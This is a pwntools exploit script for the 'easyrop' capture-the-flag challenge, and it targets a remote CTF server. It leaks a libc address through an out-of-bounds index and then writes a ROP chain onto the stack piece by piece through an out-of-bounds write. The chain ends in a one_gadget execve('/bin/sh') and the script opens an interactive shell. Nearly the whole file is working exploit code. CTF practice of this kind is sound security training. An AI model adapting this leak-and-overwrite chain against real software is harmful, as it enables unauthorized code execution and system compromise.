from pwn import *
elf = context.binary = ELF("./easyrop_patched")
r = elf.process()
libc = elf.libc
r = remote("challs.tfcctf.com", 32349)
# gdb.attach(r, '''
#     b*main+277\n
#     b*main+324\n
#     c
# ''')
def opt_2(index:bytes):
    r.sendline(str(2))
    r.sendline(index)

################
#   Leak Libc  #
################
opt_2(str(131))
r.recvuntil(b"is ")
part1 = r.recvline()
part1 = b"0x" + part1
part1 = part1.rstrip(b"\n")
opt_2(str(170))
r.recvuntil(b"is ")
part2 = r.recvline()
libc_addr = part1+part2
libc_addr = int(libc_addr, 16)
distance = 0x29e40
libc.address = libc_addr - distance
log.success(f"LIBC_Base: {hex(libc.address)}")

#################
#  One_gadget   #
#################
# 0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

one_gadget = 0xebcf8 + libc.address
pop_rdx = 0x000000000011f497 + libc.address
pop_rsi_r15 = 0x000000000002a3e3 + libc.address
pop_rbp_rbx = 0x0000000000054668 + libc.address
################
#   ret2libc   #
################
def send_data_to_x(x, data:bytes):
    r.sendline(str(1))
    r.sendlineafter(b"Select index: ", x)
    r.sendlineafter(b"Select number to write: ", data)

###################
#    Get shell    #
###################
def out_main():
    r.sendline(str(3))

# ret pointer: 0x7fffffffde98  
# overwrite 4 byte/1writer.
# send_data_to_x(offset, address) 
# address --> offset

offset_libc = 130 #<---(__libc_start_call_main+128)
offset_libc = 131 #<---(__libc_start_call_main+128) + 4
# offset: 46(Stack)
offset2 = 136  #<---- 0x7fffffffdeb0
offset3 = 137  #<---- 0x7fffffffdeb0 + 4

offset4 = 139
offset5 = 140

part1 = pop_rdx >> 32
part2 = pop_rdx << 32
part2 = part2 >> 32
send_data_to_x(str(131), str(part1))
send_data_to_x(str(130), str(part2))

#1
part1 = pop_rbp_rbx >> 32
part2 = pop_rbp_rbx << 32
part2 = part2 >> 32
send_data_to_x(str(137), str(part1))
send_data_to_x(str(136), str(part2))
#2
part1 = pop_rsi_r15 >> 32
part2 = pop_rsi_r15 << 32
part2 = part2 >> 32
send_data_to_x(str(143), str(part1))
send_data_to_x(str(142), str(part2))
#3
part1 = pop_rsi_r15 >> 32
part2 = pop_rsi_r15 << 32
part2 = part2 >> 32
send_data_to_x(str(149), str(part1))
send_data_to_x(str(148), str(part2))
#4
part1 = pop_rsi_r15 >> 32
part2 = pop_rsi_r15 << 32
part2 = part2 >> 32
send_data_to_x(str(155), str(part1))
send_data_to_x(str(154), str(part2))

part1 = one_gadget >> 32
part2 = one_gadget << 32
part2 = part2 >> 32
send_data_to_x(str(161), str(part1))
send_data_to_x(str(160), str(part2))

############
#   out    #
############
out_main()
r.interactive()
